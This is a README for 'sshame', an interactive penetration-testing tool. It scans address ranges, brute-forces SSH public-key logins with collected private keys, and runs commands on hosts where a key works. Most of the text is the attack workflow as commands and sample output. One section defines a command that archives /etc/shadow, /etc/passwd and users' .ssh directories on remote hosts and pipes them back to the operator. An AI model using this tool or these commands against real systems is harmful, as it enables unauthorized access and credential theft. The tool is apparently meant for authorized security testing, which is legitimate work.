![sshame logo](sshame.png)
# sshame - Perfect tool to brute force SSH public-key authentication
Interactive tool to brute force ssh public key authentication. Primarily intended for pentration testers. Sshame can execute commands on remote hosts.

## Installing ##

### Installing from Github ###

Clone the source from Github:

    git clone https://github.com/HynekPetrak/sshame.git
    cd sshame

Then in order to install run:

    sudo python3 setup.py install

In case you want to contribute instead of install run:

    sudo python3 setup.py develop

### Installaling via PyPI ###

`pip3` will install the latest release.

    pip3 install sshame

## Basic usage ##

sshame is interactive, based on https://github.com/python-cmd2/cmd2

    # sshame
    (sshame)

Type help to get a list of commands:

    (sshame) help

    Documented commands (type help <topic>):

    Sshame
    ======
    commands  creds  exploit  hosts  keys  resolve  session

    Uncategorized
    =============
    alias  help     macro     py    record        run_script  shell
    edit   history  playback  quit  run_pyscript  set         shortcuts


### Add target hosts ###

In the sshame shell run `hosts -a list-of-ip-ranges-or-hosts [-p port]`:

    (sshame) hosts -a 10.0.0.0/24 -p 22
    Scanning 10.0.0.0/24 on port(s) 22
    ........***.............
    Received 877 packets, got 222 answers, remaining 34 packets
    2019-08-25 19:22:15,633 sshame [I] 'Adding host (port open): 10.0.0.2 22'
    2019-08-25 19:22:15,683 sshame [I] 'Adding host (port open): 10.0.0.1 22'
    2019-08-25 19:22:15,686 sshame [I] 'Adding host (port open): 10.0.0.6 22'

 sshame will scan the given hosts with scapy and add those, which have the port open.

 To verify added hosts with TCP port open run `hosts -l`

### Load ssh keys ###

 Load private keys with `keys -a glob_path [-p list-of-passwords]`

    (sshame) keys -a test/**/*key
    2019-08-25 19:30:40,613 sshame [I] "Adding ssh keys from: ['test/**/*key']"
    2019-08-25 19:30:40,614 sshame [I] "Discovered 4 files in 'test/**/*key'."
    2019-08-25 19:30:40,615 sshame [I] 'Going to examine 4 files.'
    2019-08-25 19:30:40,635 sshame [I] 'Importing ssh-dss key: test/keys/dsa_key'
    2019-08-25 19:30:40,645 sshame [I] 'Importing ssh-rsa key: test/keys/rsa_key'
    2019-08-25 19:30:40,680 sshame [I] 'Importing ecdsa-sha2-nistp256 key: test/keys/ecdsa_key'
    2019-08-25 19:30:40,693 sshame [I] 'Importing ssh-ed25519 key: test/keys/ed25519_key'
    Loaded 4 unique keys, ignoring 0 duplicates

`-p list-of-passwords` is optional in case you load encrypted private keys protected with passwords.

List loaded keys with `keys -l`

### Test keys on hosts ###

To brute force which keys authenticates on which target run `test_keys -u list-of-users`:

    (sshame) test_keys -u root admin
    2019-08-25 19:34:31,900 sshame [I] 'Preparing target jobs...'
    2019-08-25 19:34:31,933 sshame [I] 'Matching keys - 16 jobs scheduled'
    Completed: [####################] [100.00%]
    2019-08-25 19:34:56,857 sshame [I] '---------------------------------------------------------------------------'

List matching keys with `creds -l`:

    (sshame) creds -l
    [1/1/1]: ssh -i test/keys/rsa_key root@10.0.0.2
    [2/2/1]: ssh -i test/keys/dsa_key admin@10.0.0.1

### Run commands on remote hosts ###

To run commands on remote hosts use `run_cmd -c command`, e.g.:

    (sshame) run_cmd -c whoami
    2019-08-25 23:28:22,757 sshame [I] 'Preparing target jobs...'
    2019-08-25 23:28:22,763 sshame [I] 'Executing commands - 2 jobs scheduled'
    Completed: [####################] [100.00%]
    2019-08-25 23:28:23,993 sshame [I] '---------------------------------------------------------------------------'

### Show command results ###

With `commands -r` diplay the results:

    (sshame) commands -r
    Entries: 2

    | guid                                 | host_address   |   host_port | username   | cmd                  |   exit_status | output          | updated             |
    |--------------------------------------+----------------+-------------+------------+----------------------+---------------+-----------------+---------------------|
    | 434f163a-24b5-4775-a3c1-6ea41745b18d | 10.0.0.2       |          22 | root       | whoami               |             0 | root            | 2019-08-25 21:28:23 |
    | 305e3f5d-bf4d-4024-981a-59b2dddebbcd | 10.0.0.1       |          22 | admin      | whoami               |             0 | admin           | 2019-08-25 21:28:23 |

### Pipe remote commands to a local shell ###

Define an alias `get_files` for a remote command `tar -cf -  /etc/passwd /etc/ldap.conf /etc/shadow /home/*/.ssh /etc/fstab | gzip | uuencode /dev/stdout; exit 0`
 and pipe it to a local `uudecode -o - |tar xzf -`, with:

    commands -a get_files "tar -cf -  /etc/passwd /etc/ldap.conf /etc/shadow /home/*/.ssh /etc/fstab | gzip | uuencode /dev/stdout; exit 0" -p "uudecode -o - |tar xzf -"

`exit 0` is to override tar's exit code in case of missing files.

Run te defined command with:

    run_cmd -c get_files

The output you will find in the folder `output/<host>_<port>/username/...`


### Session management ###

You may want to split wokloads into sessions. Use `session name` to switch between sessions. Default session is 
called 'default'.

Each session has its data stored in a separate sqlite db in the current directory named after the session 
name, e.g. `default.db`

    (sshame) session test
    2019-08-25 23:38:38,283 sshame [I] 'Openning session: sqlite:///test.db'

### License ###

MIT
